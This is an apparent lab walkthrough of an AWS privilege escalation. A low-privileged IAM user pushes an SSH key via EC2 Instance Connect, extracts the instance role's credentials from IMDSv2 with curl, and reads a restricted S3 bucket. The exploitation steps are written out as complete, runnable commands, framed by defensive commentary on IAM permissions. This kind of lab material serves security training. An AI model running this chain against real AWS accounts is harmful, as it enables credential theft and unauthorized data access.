# Guided Walkthrough: Privilege Escalation via ec2-instance-connect:SendSSHPublicKey to S3 Bucket

EC2 Instance Connect provides a convenient way to connect to EC2 instances by pushing temporary SSH public keys that remain valid for 60 seconds. This sounds safe on the surface — the key is short-lived and the action is logged in CloudTrail. But there is a catch: if the target instance has a privileged IAM role attached, an attacker who can push an SSH key can use that 60-second window to extract the role's temporary credentials from the Instance Metadata Service (IMDS) and then use those credentials indefinitely until they expire (up to an hour).

This scenario demonstrates a privilege escalation path where a low-privileged user leverages `ec2-instance-connect:SendSSHPublicKey` to access an EC2 instance that has an IAM role with S3 bucket access. Once on the instance, the attacker extracts the role credentials via IMDSv2 and uses them to access sensitive data in an S3 bucket. This technique is particularly dangerous because it combines two legitimate AWS services — EC2 Instance Connect and IMDS — to bypass IAM restrictions, and the 60-second SSH key window can give defenders a false sense of security.

The attack highlights the importance of restricting `ec2-instance-connect:SendSSHPublicKey` permissions and carefully evaluating which IAM roles are attached to EC2 instances, especially those accessible via Instance Connect. Organizations should treat EC2 Instance Connect permissions with the same scrutiny as direct IAM role assumption permissions, because they provide an indirect but equally effective path to role credentials.

## The Challenge

You start as `pl-prod-ec2-003-to-bucket-starting-user`, an IAM user whose credentials were provided by Terraform outputs. This user has a narrow set of permissions: `ec2-instance-connect:SendSSHPublicKey` on the target instance, plus some reconnaissance permissions (`ec2:DescribeInstances`, `iam:GetInstanceProfile`, `iam:GetRole`).

Your goal is to read the contents of `pl-sensitive-data-ec2-003-{account_id}-{suffix}` — an S3 bucket that the starting user cannot access directly. The bucket is accessible only to `pl-prod-ec2-003-to-bucket-ec2-bucket-role`, a role that is attached to a running EC2 instance in the account.

## Reconnaissance

First, confirm your identity and that you cannot currently access the target bucket:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::123456789012:user/pl-prod-ec2-003-to-bucket-starting-user

aws s3 ls s3://pl-sensitive-data-ec2-003-123456789012-abc123
# An error occurred (AccessDenied) ...
```

Good — you're the starting user and you can't touch the bucket yet. Now discover the EC2 instance and its attached role:

```bash
aws ec2 describe-instances \
  --query 'Reservations[*].Instances[*].[InstanceId,State.Name,PublicIpAddress,IamInstanceProfile.Arn]' \
  --output table
```

You should see an instance in the `running` state with a public IP and an instance profile ARN. Note the instance ID and public IP — you'll need both shortly.

Dig into the instance profile to confirm the attached role has bucket access:

```bash
aws iam get-instance-profile \
  --instance-profile-name pl-prod-ec2-003-to-bucket-ec2-bucket-profile \
  --query 'InstanceProfile.Roles[0].RoleName' \
  --output text
# pl-prod-ec2-003-to-bucket-ec2-bucket-role

aws iam get-role \
  --role-name pl-prod-ec2-003-to-bucket-ec2-bucket-role \
  --query 'Role.AssumeRolePolicyDocument'
```

The role is attached to the EC2 instance and has S3 permissions. You now have a clear target.

## Exploitation

### Step 1: Generate a temporary SSH key pair

You need a fresh key pair to push to the instance. The private key never leaves your machine:

```bash
ssh-keygen -t rsa -f /tmp/ec2-003-temp-key -N '' -q
```

### Step 2: Find the instance's availability zone

`SendSSHPublicKey` requires the availability zone as a parameter:

```bash
AVAILABILITY_ZONE=$(aws ec2 describe-instances \
  --instance-ids i-0abc123 \
  --query 'Reservations[0].Instances[0].Placement.AvailabilityZone' \
  --output text)
```

### Step 3: Push the public key via EC2 Instance Connect

This is the privilege escalation step. The key will be valid for 60 seconds:

```bash
aws ec2-instance-connect send-ssh-public-key \
  --instance-id i-0abc123 \
  --instance-os-user ec2-user \
  --availability-zone $AVAILABILITY_ZONE \
  --ssh-public-key file:///tmp/ec2-003-temp-key.pub
```

CloudTrail will log this call. You now have 60 seconds.

### Step 4: SSH into the instance and extract IMDS credentials

Connect immediately and query IMDSv2 for the role credentials. The demo script does this in a single non-interactive SSH command:

```bash
SSH_COMMAND='TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"); ROLE_NAME=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/); curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME'

CREDS_JSON=$(ssh -i /tmp/ec2-003-temp-key \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o ConnectTimeout=10 \
  ec2-user@PUBLIC_IP "${SSH_COMMAND}")
```

Parse the credentials out of the JSON response:

```bash
EXTRACTED_ACCESS_KEY=$(echo "$CREDS_JSON" | jq -r '.AccessKeyId')
EXTRACTED_SECRET_KEY=$(echo "$CREDS_JSON" | jq -r '.SecretAccessKey')
EXTRACTED_SESSION_TOKEN=$(echo "$CREDS_JSON" | jq -r '.Token')
```

You now hold temporary credentials for `pl-prod-ec2-003-to-bucket-ec2-bucket-role`. The SSH key has long since expired, but these role credentials are valid for up to an hour.

## Verification

Configure the extracted credentials and access the target bucket:

```bash
export AWS_ACCESS_KEY_ID="$EXTRACTED_ACCESS_KEY"
export AWS_SECRET_ACCESS_KEY="$EXTRACTED_SECRET_KEY"
export AWS_SESSION_TOKEN="$EXTRACTED_SESSION_TOKEN"

aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:sts::123456789012:assumed-role/pl-prod-ec2-003-to-bucket-ec2-bucket-role/...

aws s3 ls s3://pl-sensitive-data-ec2-003-123456789012-abc123
# 2024-01-01 00:00:00       1234 sensitive-data.txt

aws s3 cp s3://pl-sensitive-data-ec2-003-123456789012-abc123/sensitive-data.txt -
# [contents of sensitive-data.txt printed to stdout]
```

Bucket access confirmed. You successfully read data that the starting user had no direct permission to access.

## What Happened

The `ec2-instance-connect:SendSSHPublicKey` permission is often granted without much scrutiny because the SSH key is temporary — only valid for 60 seconds. But the key's brevity is irrelevant: during that 60-second window you can SSH into the instance and query the IMDS, which returns credentials that last up to an hour. From that point on you are operating as the EC2 role, not as yourself, and those credentials can be used from anywhere.

This attack chain is a textbook example of why AWS IAM analysis needs to account for indirect paths. A CSPM tool that only checks whether the starting user can directly assume the EC2 role would miss this entirely. The effective access path is: user can push SSH key → user can reach IMDS → user can obtain role credentials → user has all permissions of that role. Evaluating `ec2-instance-connect:SendSSHPublicKey` permissions requires correlating them with the instance's attached role and that role's permissions.
